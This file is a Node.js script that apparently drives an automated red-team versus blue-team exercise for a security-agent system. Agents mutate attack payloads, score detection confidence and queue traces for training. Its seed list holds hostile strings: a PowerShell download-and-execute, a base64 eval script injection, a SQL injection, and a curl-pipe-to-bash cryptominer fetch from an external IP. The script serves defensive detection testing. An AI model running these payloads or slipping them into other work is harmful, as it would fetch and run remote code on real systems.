
'use strict';

require('dotenv').config();
const { initializeRuntime } = require('../src/agent_runtime/init');
const { createClient } = require('redis');

const MODE = process.env.WARGAMES_MODE || 'simulation';
const BATCH_LIMIT = parseInt(process.env.WARGAMES_BATCH_LIMIT || '10', 10);

console.log(`\n[☢️] AUTONOMOUS WARGAMES ENGINE INITIALIZING...`);
console.log(`[☢️] MODE: ${MODE.toUpperCase()}`);
console.log(`[☢️] BATCH LIMIT: ${BATCH_LIMIT}\n`);


const SEED_PAYLOADS = [
    'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://10.0.0.5/payload.ps1")',
    '<script>eval(atob("YmFkY29kZQ=="))</script>',
    'SELECT * FROM users WHERE username = "admin" OR 1=1--',
    'curl -s http://185.15.22.4/miner.sh | bash'
];

async function runWargames() {
    const redisClient = createClient({
        url: process.env.REDIS_URL || 'redis://localhost:6379',
        socket: { reconnectStrategy: false }
    });

    try {
        await redisClient.connect();
    } catch (e) {
        console.error(`[❌] Wargames requires Redis. Exiting.`);
        process.exit(1);
    }

    const runtime = initializeRuntime(redisClient);
    const redTeam = runtime.getAgent('RedTeamOrchestrator');
    
    if (!redTeam) {
        console.error(`[❌] RedTeamOrchestrator not found in runtime. Exiting.`);
        process.exit(1);
    }

    console.log(`[⚔️] RED TEAM vs BLUE TEAM: Engaging Self-Play Loop...`);

    let iterations = 0;

    while (iterations < BATCH_LIMIT) {
        iterations++;
        console.log(`\n[🔄] --- WARGAME ITERATION ${iterations}/${BATCH_LIMIT} ---`);

        const seed = SEED_PAYLOADS[Math.floor(Math.random() * SEED_PAYLOADS.length)];
        let mutatedPayload = seed;

        if (MODE === 'live') {
            
            console.log(`[🔴] Red Team mutating seed payload: ${seed}`);
            try {
                const rtResult = await runtime.run('RedTeamOrchestrator', {
                    action: 'MUTATE_PAYLOAD',
                    target: 'internal-blue-team',
                    payload: seed
                });
                if (rtResult && rtResult.payload) {
                    mutatedPayload = rtResult.payload;
                }
            } catch (err) {
                console.warn(`[⚠️] Red Team mutation failed: ${err.message}. Using seed.`);
            }
        } else {
             
             mutatedPayload = `[OBFUSCATED_SIMULATION] ${seed.substring(0, 15)}...`;
        }

        console.log(`[☣️] Injecting Novel Payload into Blue Team Sensors: ${mutatedPayload}`);

        const wargameAlert = {
            alertId: `WARGAME-${Date.now()}`,
            eventType: 'ANOMALOUS_PAYLOAD_DETECTED',
            severity: 'HIGH',
            sourceIp: '10.99.99.99', 
            targetServer: 'blue-honeypot',
            payload: mutatedPayload,
            description: 'Internal Autonomous Wargame Generation'
        };

        if (MODE === 'live') {
            try {
                
                const blueResult = await runtime.run('IncidentCommanderAgent', {
                    type: 'INCIDENT_ESCALATION',
                    incident: wargameAlert
                });
                
                console.log(`[🔵] Blue Team Response Confidence: ${blueResult.confidence}`);
                
                if (blueResult.confidence > 0.8) {
                    console.log(`[🔵] Result: BLUE TEAM CAUGHT THE PAYLOAD.`);
                } else {
                    console.log(`[🔴] Result: RED TEAM EVADED DETECTION. Payload requires ML Sniper fine-tuning.`);
                }

            } catch (err) {
                console.error(`[❌] Blue Team pipeline crashed: ${err.message}`);
            }
        } else {
            
            console.log(`[🧪] SIMULATION: Blue team simulated catching the payload.`);
            
            
            const syntheticTrace = {
                trace_id: `SIM-WARGAME-${Date.now()}`,
                alert_id: wargameAlert.alertId,
                incident: wargameAlert,
                agent_outputs: {
                    'IncidentCommanderAgent': {
                        success: true,
                        recommendation: 'OBSERVE',
                        confidence: 0.4, 
                        delegation_plan: ['DetectionEngineerAgent']
                    }
                },
                tool_calls: [],
                timestamp: new Date().toISOString()
            };

            await redisClient.lPush('bayezid:training_backlog:raw', JSON.stringify(syntheticTrace));
        }

        await new Promise(r => setTimeout(r, 200));
    }

    console.log(`\n[🏁] WARGAMES BATCH COMPLETE.`);
    
    
    console.log(`[🧹] Waking up AIDataRemediationEngineer to process newly generated combat traces...`);
    
    try {
        const rawTraces = await redisClient.lRange('bayezid:training_backlog:raw', 0, -1);
        if (rawTraces && rawTraces.length > 0) {
            const remediationAgent = runtime.getAgent('AIDataRemediationEngineer');
            if (remediationAgent) {
                const result = await remediationAgent.execute({ rawTraces }, { toolRouter: runtime.toolRouter, traceId: 'WARGAME-PROCESS' });
                console.log(`[✨] Curated: ${result.curated_count} | Total in Batch: ${result.batch_size}`);
                await redisClient.del('bayezid:training_backlog:raw');
            }
        }
    } catch (e) {
        console.error(`[❌] Failed to execute Remediation Engineer: ${e.message}`);
    }

    process.exit(0);
}

runWargames().catch(console.error);
